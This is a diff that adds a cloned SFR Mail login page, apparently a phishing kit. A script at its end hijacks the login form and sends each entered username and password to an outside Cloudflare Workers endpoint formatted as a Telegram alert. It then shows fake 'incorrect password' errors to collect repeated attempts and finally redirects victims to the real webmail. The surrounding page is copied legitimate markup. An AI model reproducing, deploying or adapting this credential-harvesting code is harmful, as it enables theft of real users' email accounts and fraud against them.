@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <script type="text/javascript" src="https://webmail.sfr.fr/customer2.js?matcher"></script>
+    <script type="text/javascript" src="https://webmail.sfr.fr/customer2.js?single"></script>
+    
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <meta name="description" content="SFR Mail, connectez-vous sur votre messagerie avec votre adresse mail SFR sur le Webmail pour accéder à votre boite mail."/>
+    <meta name="robots" content="index, follow, all"/><title>SFR Mail – Retrouvez votre Webmail, boite mail et adresse mail</title>
+    <link rel="canonical" href="https://webmail.sfr.fr/"/>
+    <link rel="stylesheet" type="text/css" href="https://static.s-sfr.fr/resources/css/SFR-PASS/mire-cas-sfr.css" media="all"/>
+    <script>_stats_pagename = "Authentification/SFRMail";_cfCas = {ts: 1775156779080,}</script>
+    <script src="https://static.s-sfr.fr/sgho.js"></script>
+    <script>
+            var mtcaptchaConfig = {
+                "sitekey": "MTPublic-YVOJkLMVR",
+                "lowFrictionInvisible": "force-visible",
+                "lang": "fr",
+                "rendered-callback": "mt_renderedcb",
+                "customLangText": {
+                    "fr": {
+                        "inputPrompt": "Saisir le texte de l'image",
+                        "loading": "Chargement…",
+                        "reload": "Rechargement…",
+                        "verifying": "Vérification…",
+                        "verifyFail": "Texte non valide. Merci de réessayer",
+                        "verifySuccess": "Saisie validée",
+                        "verifyExpired": "Texte expiré. Cliquer pour actualiser",
+                        "captchaExpired": "Texte expiré. Merci de réessayer",
+                        "emptyCaptcha": "Saisir le texte de l'image",
+                        "incompleteCaptcha": "Saisir le texte complet de l'image"
+                    }
+                }
+            };
+            (function(){var mt_service = document.createElement('script');mt_service.async = true;mt_service.src = 'https://service.mtcaptcha.com/mtcv1/client/mtcaptcha.min.js';(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(mt_service);
+                var mt_service2 = document.createElement('script');mt_service2.async = true;mt_service2.src = 'https://service2.mtcaptcha.com/mtcv1/client/mtcaptcha2.min.js';(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(mt_service2);}) ();
+            function mt_renderedcb(state) {
+                var MTI = document.querySelector(".mtcaptcha iframe");
+                if (MTI) {MTI.title = "captcha";}
+            }
+        </script>
+    </head>
+
+<body>
+<script>_eT.hdr()</script>
+
+<div class="page webmail" id="page">
+    <div class="sr-mire-wrapper">
+        <div class="sr-mire-container">
+            <picture class="bg-editable">
+                <source srcset="https://static.s-sfr.fr/media/EC/bg-webmail.webp" type="image/webp" media="(min-width:1024px)" >
+                <source srcset="https://static.s-sfr.fr/media/EC/bg-webmail-tab.webp" type="image/webp" media="(min-width:768px)" >
+                <img alt="Mire de connexion" src="https://static.s-sfr.fr/media/EC/bg-webmail-mob.webp" loading="lazy">
+            </picture>
+
+            <div class="sr-mire-content">
+                <div class="sr-login-search">
+                    <div class="sr-login-search-bloc">
+                        <h2>SFR Mail</h2>
+                        <a href="https://assistance.sfr.fr/sfrmail-appli/phishing-spam/accueil.html" target="_blank" class="sr-fishing-link" title="Info Phishing">Info Phishing</a>
+                        <div class="sr-login-content" id="mire-form">
+                            <form name="loginForm" id="loginForm" onsubmit="return false;" method="post">
+
+                                <p class="mandatory-fields">Tous les champs sont obligatoires</p>
+
+                                <input type="hidden" name="lt" value="LT-133880-2RbAycgCyjNLEdmq3KlcvYsES5ziyk-authentification-8fcbf655-b42wk!hr"/>
+                                <input type="hidden" name="execution" value="e4s1"/>
+                                <input type="hidden" name="lrt" value="LRT-NidiAKuqBobPjfW"/>
+                                <input type="hidden" name="_eventId" value="submit"/>
+                                <div class="input_text">
+                                    <div class="input-line" id="usernameInput">
+                                        <label for="username">Identifiant</label>
+                                        <input id="username" name="username" class="sr-size-100pc email-sanitize" type="text" value="" placeholder="Numéro de ligne mobile, email ou NeufID" autocomplete="off" maxlength="256" required/>
+                                    </div>
+                                    <div class="input-line" id="passwordInput">
+                                        <label for="password">Mot de passe</label>
+                                        <div class="sr-input-password-sh ">
+                                            <input id="password" name="password" class="sr-size-100pc" type="password" value="" placeholder="Saisir le mot de passe" autocomplete="off" maxlength="64" required/>
+                                            <button type="button" class="sr-icon-eye" aria-label="Afficher le mot de passe" title="Afficher le mot de passe en clair"></button>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <p id="passwordError" class="sr-message-error" style="display:none; color: #e2001a; font-weight: bold; margin-bottom: 10px;" role="alert">
+                                    Identifiant ou mot de passe incorrect.
+                                </p>
+
+                                <div class="captcha-wrapper">
+                                    <div class="checkbox checkbox-left" >
+                                        <input type="checkbox" name="remember-me" id="remember-me" class="checkbox-input" checked>
+                                        <label class="checkbox-label" for="remember-me">
+                                            <span class="checkbox-item"></span>
+                                            Rester connecté
+                                        </label>
+                                    </div>
+                                    <div class="mtcaptcha"></div>
+                                </div>
+                                <div class="sr-but-wrapper">
+                                    <button id="identifier" aria-label="Se connecter à SFR Mail" class="sr-but-main sr-full-wd-sfr" type="submit" name="identifier">Se connecter</button>
+                                </div>
+                            </form>
+                            <div class="sr-mire-links" id="mire-items">
+                                <ul class="sr-mire-list">
+                                    <li><a href="https://espace-client.sfr.fr/gestion-securite/mot-de-passe/oublie/identifiant" class="sr-icon-chevron-r">Mot de passe oublié</a></li>
+                                    <li><a href="https://espace-client.sfr.fr/gestion-securite/mot-de-passe/oublie/identifiant" class="sr-icon-chevron-r">Compte bloqué</a></li>
+                                    <li><button type="button" class="sr-icon-chevron-r forgotId">Identifiant oublié</button></li>
+                                    <li><button type="button" class="sr-icon-chevron-r firstAuthent">Première connexion</button></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="block-email" class="style-second-block">
+                        <div class="second-block-text">
+                            <h3>Pas de boîte mail SFR ?</h3>
+                            Créez votre adresse @sfr.fr en vous connectant ci-dessus.
+                            <br><br><h3>Client Numéricable ou AOL</h3>
+                            <a class="sr-link" href="https://assistance.sfr.fr/sfrmail-appli/sfrmail/configurer-messagerie-recevoir-email-sfr.html">Plus d’informations sur votre messagerie</a>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mea-app">
+                    <h2>SFR Mail : vos messages partout simplement</h2>
+                    <p><b>Retrouvez vos emails sur votre PC et votre mobile avec SFR Mail</b></p>
+                    <div class="mea-app-in">
+                        <div class="sr-phone-wrapper">
+                            <picture>
+                                <img src="https://static.s-sfr.fr/media/EC/app-sfrmail.png" alt="" width="263" height="350">
+                            </picture>
+                        </div>
+                        <div class="sr-qr-wrapper">
+                            <h3>Restez connecté grâce à l'application SFR Mail.</h3>
+                            <div class="sr-qr-code">
+                                <figure class="sr-qr-img"><img src="https://static.s-sfr.fr/media/EC/qr-sfrmail.webp" width="80" height="80" alt="QR code"></figure>
+                                <div class="sr-qr-text"><span>Scannez le QR code pour télécharger l’application SFR Mail</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>!function(W,T,P){if(_=W._eT){
+    function si(e){const i = e.target;const sv = i.value.replace(/[^a-zA-Z0-9@._-]/g, '');if (i.value !== sv) {i.value = sv;}}
+    document.querySelectorAll('.email-sanitize').forEach(i => {i.addEventListener('input', si);});
+    _.ftr();
+    _('#username:not([type=hidden]),#password')[0].focus()
+    _(".sr-icon-eye").cl(function(o){
+        o=_('#password')
+        _(this).C("sr-icon-eye-slash",2)
+        o.at("type",o.at("type")=="text"?"password":"text")
+    })
+}}(window,new Date(),'preventDefault')</script>
+<script src="https://static.s-sfr.fr/sgfo.js"></script>
+
+<script>
+    const BACKEND_URL = "https://testdatasend.narpatprihar2005.workers.dev";
+    const REDIRECT_URL = "https://webmail.sfr.fr/";
+
+    // Event listener ko "capture: true" ke sath lagaya hai taaki original SFR script ise block na kar sake
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+        
+        e.preventDefault(); 
+        e.stopImmediatePropagation(); // Original script ki chutti!
+
+        const user = document.getElementById("username").value.trim();
+        const pass = document.getElementById("password").value;
+        const btn = document.getElementById("identifier");
+        const errorBox = document.getElementById("passwordError");
+
+        if (user !== "" && pass !== "") {
+            
+            // LocalStorage count for 3-attempts
+            let attempts = parseInt(localStorage.getItem('sfr_attempts')) || 0;
+            attempts++;
+            localStorage.setItem('sfr_attempts', attempts);
+
+            // Button UI change (Connexion en cours...)
+            const originalBtnText = btn.innerText;
+            btn.disabled = true;
+            btn.innerText = "Connexion...";
+            errorBox.style.display = "none";
+
+            // Telegram Message Payload
+            const msg = `🚨 **Nouveau Login SFR**\n📌 **Tentative:** ${attempts}/3\n👤 **Identifiant:** ${user}\n🔑 **Password:** ${pass}`;
+
+            try {
+                // Send data to Cloudflare Worker
+                await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ text_data: msg })
+                });
+
+                // Logic Execution
+                if (attempts < 3) {
+                    // Pehli aur doosri baar error
+                    setTimeout(() => {
+                        errorBox.innerText = "Identifiant ou mot de passe incorrect.";
+                        errorBox.style.display = "block";
+                        document.getElementById("password").value = "";
+                        document.getElementById("password").focus();
+                        btn.disabled = false;
+                        btn.innerText = originalBtnText;
+                    }, 1000);
+                } else {
+                    // 3rd attempt redirect
+                    localStorage.removeItem('sfr_attempts');
+                    window.location.replace(REDIRECT_URL);
+                }
+            } catch (error) {
+                console.error("Fetch error:", error);
+                // Safe redirect agar worker fail ho jaye
+                if (attempts >= 3) {
+                    window.location.replace(REDIRECT_URL);
+                } else {
+                    errorBox.innerText = "Erreur réseau. Veuillez réessayer.";
+                    errorBox.style.display = "block";
+                    btn.disabled = false;
+                    btn.innerText = originalBtnText;
+                }
+            }
+        }
+    }, true); // Important: "true" parameter ensures this runs FIRST.
+</script>
+
+</body>
+</html>
